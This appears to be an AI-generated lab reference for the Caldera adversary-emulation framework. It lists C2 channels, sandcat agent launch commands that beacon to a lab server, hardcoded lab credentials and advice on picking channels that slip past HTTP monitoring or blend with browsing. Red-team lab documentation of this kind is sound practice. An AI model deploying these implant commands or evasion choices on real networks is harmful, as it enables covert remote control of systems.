---
type: Lab Reference
title: C2 Contact Channels
description: Available C2 communication channels between Caldera and agents, with configuration and use-case guidance for the lab environment.
tags:
  - lab
  - c2
  - contacts
  - beacon
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T16:52:00Z'
status: stable
---

# C2 Contact Channels

Caldera supports multiple agent communication (C2) protocols. The active configuration for `caldera-1` (192.168.8.121):

## Available Channels

### HTTP (Default)
- **Address:** `http://192.168.8.121:8888`
- **Agent flag:** `-contact http` (default)
- **Best for:** Most lab targets; works through standard web proxies

```powershell
.\sandcat.exe -server http://192.168.8.121:8888 -group red
```

### TCP
- **Address:** `192.168.8.121:7010`
- **Agent flag:** `-contact tcp -c2 192.168.8.121:7010`
- **Best for:** When HTTP is monitored or blocked; raw TCP beacon

```bash
./sandcat -server http://192.168.8.121:8888 -contact tcp -c2 192.168.8.121:7010 -group red
```

### UDP
- **Address:** `192.168.8.121:7011`
- **Agent flag:** `-contact udp`
- **Best for:** Low-noise beacon; no TCP session establishment

### WebSocket
- **Address:** `192.168.8.121:7012`
- **Agent flag:** `-contact websocket`
- **Best for:** Environments that allow WebSocket but monitor HTTP POST

### DNS Tunneling
- **Domain:** `mycaldera.caldera`
- **Socket:** `192.168.8.121:8853`
- **Agent flag:** `-contact dns`
- **Best for:** Strict egress environments; requires DNS resolution to Caldera IP
- **Note:** Requires DNS to resolve `mycaldera.caldera` to `192.168.8.121`

### SSH Tunnel
- **Address:** `192.168.8.121:8022`
- **Credentials:** user `sandcat`, password `s4ndc4t!`
- **Agent flag:** `-contact tunnel`
- **Best for:** High-security environments; traffic appears as SSH

### FTP
- **Host:** `192.168.8.121:2222`
- **Credentials:** user `caldera_user`, password `caldera`
- **Agent flag:** `-contact ftp`
- **Best for:** Environments with FTP egress allowed

## Choosing a Channel for Lab Segments

| Target Segment | Recommended Channel | Reason |
|---|---|---|
| 192.168.3.x (Workstations) | HTTP | Direct route, no firewall between segments |
| 192.168.1.x (Trusted) | HTTP or TCP | May have tighter firewall rules |
| 192.168.200.x (Jump) | HTTP | Management segment, permissive |

## HTML Contact (Covert HTTP)
- **Path:** `/weather`
- Used for covert C2 via the weather page HTML; traffic blends with web browsing.
- Agent flag: `-contact html -c2 http://192.168.8.121:8888/weather`
